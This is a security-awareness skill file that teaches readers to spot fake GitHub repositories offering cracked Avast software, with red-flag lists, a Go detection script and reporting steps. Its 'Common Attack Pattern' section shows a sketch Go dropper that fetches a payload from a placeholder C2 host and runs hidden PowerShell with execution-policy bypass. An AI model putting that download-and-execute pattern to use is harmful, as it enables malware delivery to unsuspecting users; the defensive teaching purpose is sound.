---
name: security-awareness-malicious-repository-detection
description: Identify and understand malicious software distribution patterns disguised as legitimate open source projects
triggers:
  - how do I detect fake security software repositories
  - identify malicious GitHub projects distributing malware
  - recognize pirated software scams on GitHub
  - spot keygen and crack distribution repositories
  - analyze suspicious antivirus installers
  - detect trojanized software distribution patterns
  - investigate fake premium software activation schemes
  - understand malware distribution through GitHub
---

# Security Awareness: Malicious Repository Detection

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## ⚠️ WARNING: This Repository is Malicious

**This project is a SECURITY THREAT and should NOT be used, installed, or trusted.**

### Indicators of Compromise

This repository exhibits multiple red flags characteristic of malware distribution:

1. **Pirated Software Distribution**: Claims to provide "cracked" or "pre-activated" commercial software (Avast Premium Security)
2. **Keygen/Loader Keywords**: Uses terms like "keygen," "loader," "serial," "activation" 
3. **No Source Code**: Written in Go but contains no actual source code files
4. **Suspicious Growth**: Artificial star inflation (60 stars in 10 days, 6 stars/day pattern)
5. **Missing License**: NOASSERTION license for "security software"
6. **No README**: Legitimate projects document their functionality
7. **Misleading Topics**: Tags legitimate tools (retdec) to appear in security searches

## Real Threat Analysis

### What This Actually Is

```text
MALWARE DISTRIBUTION VECTOR

Disguise: Security software installer
Reality: Likely contains:
  - Trojans/Remote Access Tools (RATs)
  - Information stealers (credentials, crypto wallets)
  - Ransomware payloads
  - Cryptominers
  - Botnet agents
```

### Common Attack Pattern

```go
// What victims THINK they're downloading:
// "Avast Premium Security Installer"

// What they're ACTUALLY executing:
package main

import (
    "os/exec"
    "net/http"
)

func main() {
    // Download secondary payload from C2 server
    resp, _ := http.Get("http://malicious-c2-server.com/payload")
    
    // Execute with elevated privileges
    exec.Command("powershell", "-ExecutionPolicy", "Bypass", 
                 "-WindowStyle", "Hidden", "-Command", 
                 "downloaded_malware.ps1").Run()
    
    // Display fake "activation successful" message
    // while malware installs in background
}
```

## How to Identify Similar Threats

### Red Flag Checklist

```yaml
repository_analysis:
  suspicious_indicators:
    - name_contains: ["crack", "keygen", "loader", "pre-activated", "serial"]
    - commercial_software: true
    - no_source_code: true
    - no_readme: true
    - artificial_stars: true
    - created_recently: true
    - topic_stuffing: true  # Unrelated legitimate tools in topics
    
  risk_level: CRITICAL
  action: AVOID_AND_REPORT
```

### Detection Script

```go
package main

import (
    "fmt"
    "regexp"
    "strings"
)

type RepoThreatAnalysis struct {
    Name        string
    Description string
    Topics      []string
    HasSource   bool
    HasREADME   bool
    RiskScore   int
}

func AnalyzeRepository(repo RepoThreatAnalysis) string {
    suspiciousKeywords := []string{
        "crack", "keygen", "serial", "loader", 
        "pre-activated", "activation", "license key",
        "premium", "pro version", "full version",
    }
    
    riskScore := 0
    
    // Check for piracy keywords
    text := strings.ToLower(repo.Name + " " + repo.Description)
    for _, keyword := range suspiciousKeywords {
        if strings.Contains(text, keyword) {
            riskScore += 20
        }
    }
    
    // Check for missing source code
    if !repo.HasSource {
        riskScore += 30
    }
    
    // Check for missing documentation
    if !repo.HasREADME {
        riskScore += 20
    }
    
    // Commercial software name pattern
    commercialPattern := regexp.MustCompile(`(?i)(avast|norton|kaspersky|mcafee|adobe|microsoft|windows).*\d{4}`)
    if commercialPattern.MatchString(text) {
        riskScore += 30
    }
    
    if riskScore >= 70 {
        return "CRITICAL THREAT - Likely malware distribution"
    } else if riskScore >= 40 {
        return "HIGH RISK - Investigate further"
    }
    return "Low risk"
}

func main() {
    // Example analysis of this repository
    repo := RepoThreatAnalysis{
        Name:        "DragonflyTomb/Avast-Premium-Security-2026",
        Description: "Avast Premium Security 2026 | Full Version Installer v26 | Setup Keygen Activation",
        Topics:      []string{"antivirus", "avast", "real-time-protection"},
        HasSource:   false,
        HasREADME:   false,
    }
    
    result := AnalyzeRepository(repo)
    fmt.Printf("Threat Assessment: %s\n", result)
    // Output: Threat Assessment: CRITICAL THREAT - Likely malware distribution
}
```

## Safe Alternatives

### Legitimate Security Software Sources

```bash
# NEVER download commercial software from GitHub repositories
# claiming to provide "cracks" or "keygens"

# Official sources ONLY:
# - Avast: https://www.avast.com (official website)
# - Microsoft Defender: Built into Windows
# - Open source alternatives:
#   - ClamAV: https://github.com/Cisco-Talos/clamav
#   - OSSEC: https://github.com/ossec/ossec-hids
```

## Reporting Malicious Repositories

```bash
# Report to GitHub Security
# Navigate to repository page and click:
# ... (menu) → Report repository → Security concern → Malware distribution

# Report to antivirus vendors:
# - https://www.avast.com/report-malicious-file
# - https://www.virustotal.com/gui/home/upload

# Report to domain registrars if external links present
```

## Educational Use Cases

### For Security Training

```go
// Use this as a teaching example for:
// 1. Social engineering tactics
// 2. Malware distribution methods
// 3. Trust exploitation
// 4. GitHub platform abuse

type MalwareDistributionPattern struct {
    Tactic      string
    Vector      string
    Target      string
    Mitigation  string
}

var ExamplePattern = MalwareDistributionPattern{
    Tactic: "Typosquatting + Piracy Lure",
    Vector: "Fake software repository",
    Target: "Users seeking pirated commercial software",
    Mitigation: "User education, repository scanning, automated detection",
}
```

## Key Takeaways

1. **Never download commercial software from unofficial GitHub repositories**
2. **"Free premium" or "cracked" software is always a trap**
3. **Lack of source code in a claimed "open source" project = RED FLAG**
4. **Verify authenticity through official vendor websites only**
5. **Report suspicious repositories to protect others**

## Additional Resources

- GitHub Security Advisories: https://github.com/advisories
- OWASP Social Engineering Defense: https://owasp.org/www-community/attacks/Social_Engineering
- NIST Malware Analysis Guide: https://csrc.nist.gov/publications

---

**Remember**: If something seems too good to be true (free premium software, pre-activated licenses), it's malware. Always verify software sources and use official channels.
